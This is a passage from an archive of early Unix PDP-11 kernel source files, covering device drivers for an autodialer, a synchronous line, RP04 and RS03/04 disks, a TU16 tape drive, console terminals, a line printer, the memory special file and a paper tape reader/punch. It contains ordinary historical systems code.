	if (dp->dn_reg&(PWI|DLO))
		u.u_error = ENXIO;
	else {
		DNADDR->dn11[0].dn_stat =| MENABLE;
		dp->dn_stat = IENABLE|MENABLE|CRQ;
	}
}

dnclose(dev)
{
	DNADDR->dn11[dev.d_minor].dn_stat =& MENABLE;
}

dnwrite(dev)
{
	register struct dn *dp;
	register c;
	extern lbolt;

	dp = &DNADDR->dn11[dev.d_minor];
	for(;;) {
		while ((dp->dn_stat&DONE)==0)
			sleep(DNADDR, DNPRI);
		dp->dn_stat =& ~DONE;
	    contin:
		if (dp->dn_reg&(PWI|ACR)) {
			u.u_error = EIO;
			return;
		}
		if (dp->dn_stat&DSS)
			return;
		c = 0;
		if (u.u_count==0 || (dp->dn_stat&PND)==0 || (c=cpass())<0)
			continue;
		if (c=='-') {
			sleep(&lbolt, DNPRI);
			sleep(&lbolt, DNPRI);
			goto contin;
		}
		dp->dn_reg = c-'0';
		dp->dn_stat =| DPR;
	}
}

dnint(dev)
{
	wakeup(DNADDR);
}
-- /usr/sys/dmr/dp.c mode=0110664 uid=3 gid=3 atime=174921879 mtime=174843332 --
#
/*
 */

/*
 * DP-11 Synchronous interface driver
 * This driver is rather insensitive to the remote
 * device it talks to, which is to say most of the protocol
 * must be supplied by the calling program.
 * Exceptions: parity is even; 7 data bits per character;
 * max. of 512 characters per record; 10 second timeout
 * on waiting to receive; half-duplex transmission.
 */

#include "../param.h"
#include "../conf.h"
#include "../user.h"
#include "../buf.h"

/* control info */
struct {
	char	*dp_buf;
	char	*dp_bufp;
	int	dp_nxmit;
	char	dp_state;
	char	dp_timer;
	int	dp_proc;
} dp11;

/* device registers */
struct {
	int	dprcsr;
	char	dprbuf;
	char	dpsyn0;
	int	dptcsr;
	char	dptbuf;
	char	dpsyn1;
};

/* bits */
#define	ODDPAR	010000
#define	IENABLE	0100
#define	HDUPLX	02

#define	CTRANS	0100000
#define	RORUN	040000
#define	RING	020000
#define	DSRDY	010000
#define	CARRIER	04000
#define	DONE	0200
#define	IENABLE	0100
#define	SIENABL	040

#define	WRITE	1
#define	READ	0

#define	DTRDY	01
#define	RCVACT	04000

#define	DPADDR	0174770
#define	DPPRI	5
#define	SYN	026		/* (receive) sync character */

/*
 * The open fails unless the device is not open or
 * the opening process is the one that has it open already.
 */
dpopen(dev, flag)
{
	int dptimeout();

	if (dp11.dp_proc!=0 && dp11.dp_proc!=u.u_procp) {
		u.u_error = ENXIO;
		return;
	}
	dp11.dp_proc = u.u_procp;
	dp11.dp_state = READ;
	if (dp11.dp_buf==0) {
		dp11.dp_buf = getblk(NODEV);
		dp11.dp_bufp = dp11.dp_buf->b_addr;
		dp11.dp_timer = HZ;
		timeout(dptimeout, 0, HZ);
	}
	DPADDR->dpsyn0 = SYN;
	DPADDR->dprcsr = HDUPLX|IENABLE;
	DPADDR->dptcsr = IENABLE|SIENABL|DTRDY;
}

dpclose()
{
	DPADDR->dprcsr = 0;
	DPADDR->dptcsr = 0;
	dp11.dp_timer = 0;
	dp11.dp_proc = 0;
	if (dp11.dp_buf != 0) {
		brelse(dp11.dp_buf);
		dp11.dp_buf = 0;
	}
}

/*
 * Read waits until:
 *  there is loss of "data set ready", or
 *  a timeout occurs, or
 *  a full record has been received.
 * The former two result in an error.
 */
dpread()
{
	register char *bp, **epp;

	bp = dp11.dp_buf->b_addr;
	epp = &dp11.dp_bufp;
	for(;;) {
		if(dpwait())
			return;
		if (*epp > bp)
			break;
		spl6();
		if (dp11.dp_timer <= 1) {
			spl0();
			return;
		}
		sleep(&dp11, DPPRI);
		spl0();
	}
	iomove(dp11.dp_buf, 0, min(u.u_count, *epp-bp), B_READ);
}

/*
 * write checks to make sure that the data set is not reading,
 * and that it is ready.  Then the record is copied
 * and transmission started.
 */
dpwrite()
{
	register char *bp;

	if (u.u_count==0 || dpwait())
		return;
	dp11.dp_state = WRITE;
	bp = dp11.dp_buf->b_addr;
	dp11.dp_bufp = bp;
	if (u.u_count>512)
		u.u_count = 512;
	dp11.dp_nxmit = u.u_count;
	iomove(dp11.dp_buf, 0, u.u_count, B_WRITE);
	dpstart();
}

/*
 * If "data set ready" is down return an error; otherwise
 * wait until the dataset is in read state with no carrier,
 * which means a record has just been received.
 */
dpwait()
{
	for(;;) {
		if ((DPADDR->dptcsr&DSRDY)==0 || dp11.dp_buf==0) {
			u.u_error = EIO;
			return(1);
		}
		spl6();
		if (dp11.dp_state==READ && (DPADDR->dptcsr&CARRIER)==0) {
			spl0();
			return(0);
		}
		sleep(&dp11, DPPRI);
		spl0();
	}
}

/*
 * Start off the next character to be transmitted;
 * when the record is done, drop back into read state.
 */
dpstart()
{
	register int c;
	extern char partab[];

	dp11.dp_timer = 10;
	if (--dp11.dp_nxmit >= 0) {
		c = (*dp11.dp_bufp++) & 0177;
		DPADDR->dptbuf = c | ~partab[c]&0200;
	} else {
		dp11.dp_bufp = dp11.dp_buf->b_addr;
		dp11.dp_state = READ;
	}
}

/*
 * Count down the DP timer (once per second)
 * If it runs out, it presumably means the other station
 * won't speak.
 */
dptimeout()
{
	if (dp11.dp_timer==0)
		return;
	if (--dp11.dp_timer==0) {
		dpturnaround();
		dp11.dp_timer = 1;
	}
	timeout(dptimeout, 0, HZ);
}

/*
 * Receiver interrupt: if reading, stash character
 * unless there is an overrun.
 */
dprint()
{
	register int c;

	c = DPADDR->dprbuf & 0177;
	if (dp11.dp_state==READ) {
		if ((DPADDR->dprcsr&ODDPAR) == 0)
			c =| 0200;
		if (dp11.dp_bufp < dp11.dp_buf->b_addr+512)
			*dp11.dp_bufp++ = c;
	}
}

/*
 * Transmitter interrupt:
 * Knock down hardware bits.
 * If carrier has dropped, the record is done, so turn the line around;
 * otherwise start another character.
 */
dpxint()
{
	register int dpstat;

	dpstat = DPADDR->dptcsr;
	DPADDR->dptcsr =& ~(CTRANS|RORUN|RING|DONE);
	if (dpstat & (CTRANS|RORUN))
		dpturnaround();
	else if (dpstat&DONE && dp11.dp_state==WRITE)
		dpstart();
}

/*
 * Change the state from writing to reading at the end of a record.
 */
dpturnaround()
{
	DPADDR->dprcsr =& ~RCVACT;
	if (dp11.dp_state==WRITE) {
		dp11.dp_timer = 10;
		dp11.dp_state = READ;
		dp11.dp_bufp = dp11.dp_buf->b_addr;
	}
	wakeup(&dp11);
}
-- /usr/sys/dmr/hp.c mode=0110664 uid=3 gid=3 atime=174921888 mtime=174905910 --
#
/*
 */

/*
 * RP04 disk driver
 *
 * This driver has been tested on a working RP04 for a few hours.
 * It does not attempt ECC error correction and is probably
 * deficient in general in the case of errors and when packs
 * are dismounted.
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

struct {
	int	hpcs1;	/* Control and Status register 1 */
	int	hpwc;	/* Word count register */
	int	hpba;	/* UNIBUS address register */
	int	hpda;	/* Desired address register */
	int	hpcs2;	/* Control and Status register 2*/
	int	hpds;	/* Drive Status */
	int	hper1;	/* Error register 1 */
	int	hpas;	/* Attention Summary */
	int	hpla;	/* Look ahead */
	int	hpdb;	/* Data buffer */
	int	hpmr;	/* Maintenance register */
	int	hpdt;	/* Drive type */
	int	hpsn;	/* Serial number */
	int	hpof;	/* Offset register */
	int	hpca;	/* Desired Cylinder address register*/
	int	hpcc;	/* Current Cylinder */
	int	hper2;	/* Error register 2 */
	int	hper3;	/* Error register 3 */
	int	hppos;	/* Burst error bit position */
	int	hppat;	/* Burst error bit pattern */
	int	hpbae;	/* 11/70 bus extension */
};

#define	HPADDR	0176700
#define	NHP	8

struct {
	char	*nblocks;
	int	cyloff;
} hp_sizes[] {
	9614,	0,		/* cyl 0 thru 23 */
				/* cyl 24 thru 43 available */
	-1,	44,		/* cyl 44 thru 200 */
	-1,	201,		/* cyl 201 thru 357 */
	20900,	358,		/* cyl 358 thru 407 */
				/* cyl 408 thru 410 blank */
	40600,	0,
	40600,	100,
	40600,	200,
	40600,	300,
};


struct	devtab	hptab;
struct	buf	hpbuf;

char	hp_openf;

			/* Drive Commands */
#define	GO	01
#define	PRESET	020
#define	RECAL	06
#define RCLR	010
#define OFFSET	014

#define	READY	0200	/* hpds - drive ready */
#define	PIP	020000	/* hpds - Positioning Operation in Progress */
#define	ERR	040000	/* hpcs1 - composite error */

#define	DU	040000	/* hper1 - Drive Unsafe	*/
#define	DTE	010000  /* hper1 - Drive Timing Error	*/
#define	OPI	020000  /* hper1 - Operation Incomplete	*/
		/* Error Correction Code errors */
#define DCK	0100000	/* hper1 - Data Check error */
#define ECH	0100    /* hper1 - ECC hard error */

#define CLR	040	/* hpcs2 - Controller Clear */

#define FMT22	010000	/* hpof - 16 bit /word format */
/*
 * Use av_back to save track+sector,
 * b_resid for cylinder.
 */

#define	trksec	av_back
#define	cylin	b_resid

hpopen()
{

	if(!hp_openf){
		hp_openf++;
		HPADDR->hpcs2 = CLR;
		HPADDR->hpcs1 = RCLR|GO;
		HPADDR->hpcs1 = PRESET|GO;
		HPADDR->hpof = FMT22;
	}
}

hpstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register char *p1, *p2;

	bp = abp;
	p1 = &hp_sizes[bp->b_dev.d_minor&07];
	if (bp->b_dev.d_minor >= (NHP<<3) ||
	    bp->b_blkno >= p1->nblocks) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	bp->cylin = p1->cyloff;
	p1 = bp->b_blkno;
	p2 = lrem(p1, 22);
	p1 = ldiv(p1, 22);
	bp->trksec = (p1%19)<<8 | p2;
	bp->cylin =+ p1/19;
	spl5();
	if ((p1 = hptab.d_actf)==0)
		hptab.d_actf = bp;
	else {
		for (; p2 = p1->av_forw; p1 = p2) {
			if (p1->cylin <= bp->cylin
			 && bp->cylin <  p2->cylin
			 || p1->cylin >= bp->cylin
			 && bp->cylin >  p2->cylin) 
				break;
		}
		bp->av_forw = p2;
		p1->av_forw = bp;
	}
	if (hptab.d_active==0)
		hpstart();
	spl0();
}

hpstart()
{
	register struct buf *bp;

	if ((bp = hptab.d_actf) == 0)
		return;
	hptab.d_active++;
	HPADDR->hpcs2 = bp->b_dev.d_minor >> 3;
	HPADDR->hpca = bp->cylin;
	rhstart(bp, &HPADDR->hpda, bp->trksec, &HPADDR->hpbae);
}

hpintr()
{
	register struct buf *bp;
	register int ctr;

	if (hptab.d_active == 0)
		return;
	bp = hptab.d_actf;
	hptab.d_active = 0;
	if (HPADDR->hpcs1 & ERR) {		/* error bit */
		deverror(bp, HPADDR->hpcs2, 0);
		if(HPADDR->hper1 & (DU|DTE|OPI)) {
			HPADDR->hpcs2 = CLR;
			HPADDR->hpcs1 = RECAL|GO;
			ctr = 0;
			while ((HPADDR->hpds&PIP) && --ctr);
		}
		HPADDR->hpcs1 = RCLR|GO;
		if (++hptab.d_errcnt <= 10) {
			hpstart();
			return;
		}
		bp->b_flags =| B_ERROR;
	}
	hptab.d_errcnt = 0;
	hptab.d_actf = bp->av_forw;
	bp->b_resid = HPADDR->hpwc;
	iodone(bp);
	hpstart();
}

hpread(dev)
{

	if(hpphys(dev))
	physio(hpstrategy, &hpbuf, dev, B_READ);
}

hpwrite(dev)
{

	if(hpphys(dev))
	physio(hpstrategy, &hpbuf, dev, B_WRITE);
}

hpphys(dev)
{
	register c;

	c = lshift(u.u_offset, -9);
	c =+ ldiv(u.u_count+511, 512);
	if(c > hp_sizes[dev.d_minor & 07].nblocks) {
		u.u_error = ENXIO;
		return(0);
	}
	return(1);
}

-- /usr/sys/dmr/hs.c mode=0100664 uid=3 gid=3 atime=174921896 mtime=174905931 --
#
/*
 */

/*
 * RS03/04 disk driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"


struct {
	int	hscs1;	/* Control and Status register 1 */
	int	hswc;	/* Word count register */
	int	hsba;	/* UNIBUS address register */
	int	hsda;	/* Desired address register */
	int	hscs2;	/* Control and Status register 2 */
	int	hsds;	/* Drive Status */
	int	hser;	/* Error register */
	int	hsas;	/* not used */
	int	hsla;	/* not used */
	int	hsdb;	/* not used */
	int	hsmr;	/* not used */
	int	hsdt;	/* not used */
	int	hsbae;	/* 11/70 bus extension */
};

struct	devtab	hstab;
struct	buf	rhsbuf;

#define	HSADDR	0172040

#define ERR	040000	/* hscs1 - composite error */

#define GO	01
#define RCLR	010
#define	DRY	0200	/* hsds - Drive Ready */

hsstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register mblks;

	bp = abp;
	mblks = 1024; /* RJS03 */
	if(bp->b_dev.d_minor >= 8)
		mblks = 2048; /* RJS04 */
	if(bp->b_blkno >= mblks) {
		bp->b_flags =| B_ERROR;
		iodone(bp);
		return;
	}
	bp->av_forw = 0;
	spl5();
	if (hstab.d_actf==0)
		hstab.d_actf = bp; else
		hstab.d_actl->av_forw = bp;
	hstab.d_actl = bp;
	if (hstab.d_active==0)
		hsstart();
	spl0();
}

hsstart()
{
	register struct buf *bp;
	register addr;

	if ((bp = hstab.d_actf) == 0)
		return;
	hstab.d_active++;
	addr = bp->b_blkno;
	if(bp->b_dev.d_minor < 8)
		addr =<< 1; /* RJS03 */
	HSADDR->hscs2 = bp->b_dev.d_minor & 07;
	rhstart(bp, &HSADDR->hsda, addr<<1, &HSADDR->hsbae);
}

hsintr()
{
	register struct buf *bp;

	if (hstab.d_active == 0)
		return;
	bp = hstab.d_actf;
	hstab.d_active = 0;
	if(HSADDR->hscs1 & ERR){	/* error bit */
		deverror(bp, HSADDR->hscs2, 0);
		HSADDR->hscs1 = RCLR|GO;
		if (++hstab.d_errcnt <= 10) {
			hsstart();
			return;
		}
		bp->b_flags =| B_ERROR;
	}
	hstab.d_errcnt = 0;
	hstab.d_actf = bp->av_forw;
	iodone(bp);
	hsstart();
}

hsread(dev)
{

	physio(hsstrategy, &rhsbuf, dev, B_READ);
}

hswrite(dev)
{

	physio(hsstrategy, &rhsbuf, dev, B_WRITE);
}
-- /usr/sys/dmr/ht.c mode=0110664 uid=3 gid=3 atime=174921904 mtime=174906102 --
#
/*
 */

/*
 * TJU16 tape driver
 */

#include "../param.h"
#include "../buf.h"
#include "../conf.h"
#include "../user.h"

struct {
	int	htcs1;
	int	htwc;
	int	htba;
	int	htfc;
	int	htcs2;
	int	htds;
	int	hter;
	int	htas;
	int	htck;
	int	htdb;
	int	htmr;
	int	htdt;
	int	htsn;
	int	httc;
	int	htbae;	/* 11/70 bus extension */
};

struct	devtab	httab;
struct	buf	rhtbuf;

#define	NUNIT	8

char	h_openf[NUNIT];
char	*h_blkno[NUNIT];
char	*h_nxrec[NUNIT];

#define	HTADDR	0172440

#define	GO	01
#define	NOP	0
#define	WEOF	026
#define	SFORW	030
#define	SREV	032
#define	ERASE	024
#define	REW	06
#define	CLR	010
#define	P800	01300		/* 800 + pdp11 mode */
#define	P1600	02300		/* 1600 + pdp11 mode */
#define	IENABLE	0100
#define	CRDY	0200
#define	EOF	04
#define	DRY	0200
#define	MOL	010000
#define	PIP	020000
#define	ERR	040000

#define	SSEEK	1
#define	SIO	2

htopen(dev, flag)
{
	register unit;

	unit = dev.d_minor&077;
	if (unit >= NUNIT || h_openf[unit])
		u.u_error = ENXIO;
	else {
		h_openf[unit]++;
		h_blkno[unit] = 0;
		h_nxrec[unit] = 65535;
		hcommand(dev, NOP);
	}
}

htclose(dev, flag)
{
	register int unit;

	unit = dev.d_minor&077;
	h_openf[unit] = 0;
	if (flag) {
		hcommand(dev, WEOF);
		hcommand(dev, WEOF);
	}
	hcommand(dev, REW);
}

hcommand(dev, com)
{
	register unit;
	extern lbolt;

	unit = dev.d_minor;
	while (httab.d_active || (HTADDR->htcs1 & CRDY)==0)
		sleep(&lbolt, 1);
	HTADDR->htcs2 = (unit>>3)&07;
	while((HTADDR->htds&DRY) == 0)
		sleep(&lbolt, 1);
	if(unit >= 64)
		HTADDR->httc = P800 | (unit&07); else
		HTADDR->httc = P1600 | (unit&07);
	while((HTADDR->htds&(MOL|PIP)) != MOL)
		sleep(&lbolt, 1);
	HTADDR->htcs1 = com | GO;
}

htstrategy(abp)
struct buf *abp;
{
	register struct buf *bp;
	register char **p;

	bp = abp;
	p = &h_nxrec[bp->b_dev.d_minor&077];
	if (*p <= bp->b_blkno) {
		if (*p < bp->b_blkno) {
			bp->b_flags =| B_ERROR;
			iodone(bp);
			return;
		}
		if (bp->b_flags&B_READ) {
			clrbuf(bp);
			iodone(bp);
			return;
		}
	}
	if ((bp->b_flags&B_READ)==0)
		*p = bp->b_blkno + 1;
	bp->av_forw = 0;
	spl5();
	if (httab.d_actf==0)
		httab.d_actf = bp;
	else
		httab.d_actl->av_forw = bp;
	httab.d_actl = bp;
	if (httab.d_active==0)
		htstart();
	spl0();
}

htstart()
{
	register struct buf *bp;
	register int unit;
	register char *blkno;

    loop:
	if ((bp = httab.d_actf) == 0)
		return;
	unit = bp->b_dev.d_minor;
	HTADDR->htcs2 = (unit>>3)&07;
	if(unit >= 64)
		HTADDR->httc = P800 | (unit&07); else
		HTADDR->httc = P1600 | (unit&07);
	unit =& 077;
	blkno = h_blkno[unit];
	if (h_openf[unit] < 0 || (HTADDR->htcs1 & CRDY)==0) {
		bp->b_flags =| B_ERROR;
		httab.d_actf = bp->av_forw;
		iodone(bp);
		goto loop;
	}
	if (blkno != bp->b_blkno) {
		httab.d_active = SSEEK;
		if (blkno < bp->b_blkno) {
			HTADDR->htfc = blkno - bp->b_blkno;
			HTADDR->htcs1 = SFORW|IENABLE|GO;
		} else {
			if (bp->b_blkno == 0)
				HTADDR->htcs1 = REW|IENABLE|GO;
			else {
				HTADDR->htfc = bp->b_blkno - blkno;
				HTADDR->htcs1 = SREV|IENABLE|GO;
			}
		}
		return;
	}
	httab.d_active = SIO;
	rhstart(bp, &HTADDR->htfc, bp->b_wcount<<1, &HTADDR->htbae);
}

htintr()
{
	register struct buf *bp;
	register int unit;

	if ((bp = httab.d_actf)==0)
		return;
	unit = bp->b_dev.d_minor&077;
	if (HTADDR->htcs1 & ERR) {
/*
		deverror(bp, HTADDR->hter, 0);
 */
		if(HTADDR->htds&EOF) {
			if(bp != &rhtbuf && h_openf[unit])
				h_openf[unit] = -1;
		}
		HTADDR->htcs1 = ERR|CLR|GO;
		if ((HTADDR->htds&DRY)!=0 && httab.d_active==SIO) {
			if (++httab.d_errcnt < 10) {
				h_blkno[unit]++;
				httab.d_active = 0;
				htstart();
				return;
			}
		}
		bp->b_flags =| B_ERROR;
		httab.d_active = SIO;
	}
	if (httab.d_active == SIO) {
		httab.d_errcnt = 0;
		h_blkno[unit]++;
		httab.d_actf = bp->av_forw;
		httab.d_active = 0;
		iodone(bp);
		bp->b_resid = HTADDR->htfc;
	} else
		h_blkno[unit] = bp->b_blkno;
	htstart();
}

htread(dev)
{
	htphys(dev);
	physio(htstrategy, &rhtbuf, dev, B_READ);
	u.u_count = -rhtbuf.b_resid;
}

htwrite(dev)
{
	htphys(dev);
	physio(htstrategy, &rhtbuf, dev, B_WRITE);
	u.u_count = 0;
}

htphys(dev)
{
	register unit, a;

	unit = dev.d_minor;
	a = lshift(u.u_offset, -9);
	h_blkno[unit] = a;
	h_nxrec[unit] = ++a;
}
-- /usr/sys/dmr/kl.c mode=0100664 uid=3 gid=3 atime=174921914 mtime=174843351 --
#
/*
 */

/*
 *   KL/DL-11 driver
 */
#include "../param.h"
#include "../conf.h"
#include "../user.h"
#include "../tty.h"
#include "../proc.h"

/* base address */
#define	KLADDR	0177560	/* console */
#define	KLBASE	0176500	/* kl and dl11-a */
#define	DLBASE	0175610	/* dl-e */
#define	NKL11	1
#define	NDL11	0
#define DSRDY	02
#define	RDRENB	01

struct	tty kl11[NKL11+NDL11];

struct klregs {
	int klrcsr;
	int klrbuf;
	int kltcsr;
	int kltbuf;
}

klopen(dev, flag)
{
	register char *addr;
	register struct tty *tp;

	if(dev.d_minor >= NKL11+NDL11) {
		u.u_error = ENXIO;
		return;
	}
	tp = &kl11[dev.d_minor];
	if (u.u_procp->p_ttyp == 0) {
		u.u_procp->p_ttyp = tp;
		tp->t_dev = dev;
	}
	/*
	 * set up minor 0 to address KLADDR
	 * set up minor 1 thru NKL11-1 to address from KLBASE
	 * set up minor NKL11 on to address from DLBASE
	 */
	addr = KLADDR + 8*dev.d_minor;
	if(dev.d_minor)
		addr =+ KLBASE-KLADDR-8;
	if(dev.d_minor >= NKL11)
		addr =+ DLBASE-KLBASE-8*NKL11+8;
	tp->t_addr = addr;
	if ((tp->t_state&ISOPEN) == 0) {
		tp->t_state = ISOPEN|CARR_ON;
		tp->t_flags = XTABS|LCASE|ECHO|CRMOD;
		tp->t_erase = CERASE;
		tp->t_kill = CKILL;
	}
	addr->klrcsr =| IENABLE|DSRDY|RDRENB;
	addr->kltcsr =| IENABLE;
}

klclose(dev)
{
	register struct tty *tp;

	tp = &kl11[dev.d_minor];
	wflushtty(tp);
	tp->t_state = 0;
}

klread(dev)
{
	ttread(&kl11[dev.d_minor]);
}

klwrite(dev)
{
	ttwrite(&kl11[dev.d_minor]);
}

klxint(dev)
{
	register struct tty *tp;

	tp = &kl11[dev.d_minor];
	ttstart(tp);
	if (tp->t_outq.c_cc == 0 || tp->t_outq.c_cc == TTLOWAT)
		wakeup(&tp->t_outq);
}

klrint(dev)
{
	register int c, *addr;
	register struct tty *tp;

	tp = &kl11[dev.d_minor];
	addr = tp->t_addr;
	c = addr->klrbuf;
	addr->klrcsr =| RDRENB;
	if ((c&0177)==0)
		addr->kltbuf = c;	/* hardware botch */
	ttyinput(c, tp);
}

klsgtty(dev, v)
int *v;
{
	register struct tty *tp;

	tp = &kl11[dev.d_minor];
	ttystty(tp, v);
}
-- /usr/sys/dmr/lp.c mode=0100664 uid=3 gid=3 atime=174921922 mtime=174843355 --
#
/*
 */

/*
 * LP-11 Line printer driver
 */

#include "../param.h"
#include "../conf.h"
#include "../user.h"

#define	LPADDR	0177514

#define	IENABLE	0100
#define	DONE	0200

#define	LPPRI	10
#define	LPLWAT	50
#define	LPHWAT	100
#define	EJLINE	60
#define	MAXCOL	80

struct {
	int lpsr;
	int lpbuf;
};

struct  {
	int	cc;
	int	cf;
	int	cl;
	int	flag;
	int	mcc;
	int	ccc;
	int	mlc;
} lp11;

#define	CAP	01		/* Set to 0 for 96-char printer, else to 01 */
#define	EJECT	02
#define	OPEN	04
#define IND	010		/* Set to 0 for no indent, else to 010 */

#define	FORM	014

lpopen(dev, flag)
{

	if(lp11.flag & OPEN || LPADDR->lpsr < 0) {
		u.u_error = EIO;
		return;
	}
	lp11.flag =| (IND|EJECT|OPEN);
	LPADDR->lpsr =| IENABLE;
	lpcanon(FORM);
}

lpclose(dev, flag)
{
	lpcanon(FORM);
	lp11.flag = 0;
}

lpwrite()
{
	register int c;

	while ((c=cpass())>=0)
		lpcanon(c);
}

lpcanon(c)
{
	register c1, c2;

	c1 = c;
	if(lp11.flag&CAP) {
		if(c1>='a' && c1<='z')
			c1 =+ 'A'-'a'; else
		switch(c1) {

		case '{':
			c2 = '(';
			goto esc;

		case '}':
			c2 = ')';
			goto esc;

		case '`':
			c2 = '\'';
			goto esc;

		case '|':
			c2 = '!';
			goto esc;

		case '~':
			c2 = '^';

		esc:
			lpcanon(c2);
			lp11.ccc--;
			c1 = '-';
		}
	}

	switch(c1) {

	case '\t':
		lp11.ccc = (lp11.ccc+8) & ~7;
		return;

	case FORM:
	case '\n':
		if((lp11.flag&EJECT) == 0 ||
		   lp11.mcc!=0 || lp11.mlc!=0) {
			lp11.mcc = 0;
			lp11.mlc++;
			if(lp11.mlc >= EJLINE && lp11.flag&EJECT)
				c1 = FORM;
			lpoutput(c1);
			if(c1 == FORM)
				lp11.mlc = 0;
		}

	case '\r':
		lp11.ccc = 0;
		if(lp11.flag&IND)
			lp11.ccc = 8;
		return;

	case 010:
		if(lp11.ccc > 0)
			lp11.ccc--;
		return;

	case ' ':
		lp11.ccc++;
		return;

	default:
		if(lp11.ccc < lp11.mcc) {
			lpoutput('\r');
			lp11.mcc = 0;
		}
		if(lp11.ccc < MAXCOL) {
			while(lp11.ccc > lp11.mcc) {
				lpoutput(' ');
				lp11.mcc++;
			}
			lpoutput(c1);
			lp11.mcc++;
		}
		lp11.ccc++;
	}
}

lpstart()
{
	register int c;

	while (LPADDR->lpsr&DONE && (c = getc(&lp11)) >= 0)
		LPADDR->lpbuf = c;
}

lpint()
{
	register int c;

	lpstart();
	if (lp11.cc == LPLWAT || lp11.cc == 0)
		wakeup(&lp11);
}

lpoutput(c)
{
	if (lp11.cc >= LPHWAT)
		sleep(&lp11, LPPRI);
	putc(c, &lp11);
	spl4();
	lpstart();
	spl0();
}
-- /usr/sys/dmr/mem.c mode=0100664 uid=3 gid=3 atime=174921930 mtime=174906135 --
#
/*
 */

/*
 *	Memory special file
 *	minor device 0 is physical memory
 *	minor device 1 is kernel memory
 *	minor device 2 is EOF/RATHOLE
 */

#include "../param.h"
#include "../user.h"
#include "../conf.h"
#include "../seg.h"

mmread(dev)
{
	register c, bn, on;
	int a, d;

	if(dev.d_minor == 2)
		return;
	do {
		bn = lshift(u.u_offset, -6);
		on = u.u_offset[1] & 077;
		a = UISA->r[0];
		d = UISD->r[0];
		spl7();
		UISA->r[0] = bn;
		UISD->r[0] = 077406;
		if(dev.d_minor == 1)
			UISA->r[0] = (ka6-6)->r[(bn>>7)&07] + (bn & 0177);
		c = fuibyte(on);
		UISA->r[0] = a;
		UISD->r[0] = d;
		spl0();
	} while(u.u_error==0 && passc(c)>=0);
}

mmwrite(dev)
{
	register c, bn, on;
	int a, d;

	if(dev.d_minor == 2) {
		c = u.u_count;
		u.u_count = 0;
		u.u_base =+ c;
		dpadd(u.u_offset, c);
		return;
	}
	for(;;) {
		bn = lshift(u.u_offset, -6);
		on = u.u_offset[1] & 077;
		if ((c=cpass())<0 || u.u_error!=0)
			break;
		a = UISA->r[0];
		d = UISD->r[0];
		spl7();
		UISA->r[0] = bn;
		UISD->r[0] = 077406;
		if(dev.d_minor == 1)
			UISA->r[0] = (ka6-6)->r[(bn>>7)&07] + (bn & 0177);
		suibyte(on, c);
		UISA->r[0] = a;
		UISD->r[0] = d;
		spl0();
	}
}
-- /usr/sys/dmr/partab.c mode=0100664 uid=3 gid=3 atime=174921936 mtime=174843363 --
/*
 */

char partab[] {
	0001,0201,0201,0001,0201,0001,0001,0201,
	0202,0004,0003,0205,0005,0206,0201,0001,
	0201,0001,0001,0201,0001,0201,0201,0001,
	0001,0201,0201,0001,0201,0001,0001,0201,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0000,0200,0200,0000,0200,0000,0000,0200,
	0000,0200,0200,0000,0200,0000,0000,0200,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0000,0200,0200,0000,0200,0000,0000,0200,
	0000,0200,0200,0000,0200,0000,0000,0200,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0000,0200,0200,0000,0200,0000,0000,0200,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0200,0000,0000,0200,0000,0200,0200,0000,
	0000,0200,0200,0000,0200,0000,0000,0201
};
-- /usr/sys/dmr/pc.c mode=0100664 uid=3 gid=3 atime=174921941 mtime=174906192 --
#
/*
 */

/*
 * PC-11 Paper tape reader/punch driver
 */

#include "../param.h"
#include "../conf.h"
#include "../user.h"

#define	PCADDR	0177550

#define	CLOSED	0
#define	WAITING	1
#define	READING	2
#define	EOF	3

#define	RDRENB	01
#define	IENABLE	0100
#define	DONE	0200
#define	BUSY	04000
#define	ERROR	0100000

#define	PCIPRI	30
#define	PCOPRI	40
#define	PCOLWAT	50
#define	PCOHWAT	100
#define	PCIHWAT	250

struct {
	int pcrcsr;
	int pcrbuf;
	int pcpcsr;
	int pcpbuf;
};

struct clist {
	int	cc;
	int	cf;
	int	cl;
};

struct pc11 {
	int	pcstate;
	struct	clist pcin;
	struct	clist pcout;
} pc11;

pcopen(dev, flag)
{
	extern lbolt;

	if (flag==0) {
		if (pc11.pcstate!=CLOSED) {
			u.u_error = ENXIO;
			return;
		}
		pc11.pcstate = WAITING;
		while(pc11.pcstate==WAITING) {
			PCADDR->pcrcsr = IENABLE|RDRENB;
			sleep(&lbolt, PCIPRI);
		}
	} else {
		PCADDR->pcpcsr =| IENABLE;
		pcleader();
	}
}

pcclose(dev, flag)
{
	if (flag==0) {
		spl4();
		while (getc(&pc11.pcin) >= 0);
		PCADDR->pcrcsr = 0;
		pc11.pcstate = CLOSED;
		spl0();
	} else
		pcleader();
}

pcread()
{
	register int c;

	spl4();
	do {
		while ((c = getc(&pc11.pcin)) < 0) {
			if (pc11.pcstate==EOF)
				goto out;
			if ((PCADDR->pcrcsr&(ERROR|BUSY|DONE))==0)
				PCADDR->pcrcsr =| IENABLE|RDRENB;
			sleep(&pc11.pcin, PCIPRI);
		}
	} while (passc(c)>=0);
out:
	spl0();
}

pcwrite()
{
	register int c;

	while ((c=cpass())>=0)
		pcoutput(c);
}

pcstart()
{
	register int c;

	if (PCADDR->pcpcsr&DONE && (c = getc(&pc11.pcout)) >= 0)
		PCADDR->pcpbuf = c;
}

pcrint()
{
	if (pc11.pcstate==WAITING) {
		if (PCADDR->pcrcsr&ERROR)
			return;
		pc11.pcstate = READING;
	}
	if (pc11.pcstate==READING) {
		if (PCADDR->pcrcsr&ERROR)
			pc11.pcstate = EOF;
		else {
			putc(PCADDR->pcrbuf, &pc11.pcin);
			if (pc11.pcin.cc < PCIHWAT)
				PCADDR->pcrcsr =| IENABLE|RDRENB;
		}
		wakeup(&pc11.pcin);
	}
}

pcpint()
{

	pcstart();
	if (pc11.pcout.cc <= PCOLWAT)
		wakeup(&pc11.pcout);
}

pcoutput(c)
{
	if (PCADDR->pcpcsr&ERROR) {
		u.u_error = EIO;
		return;
	}
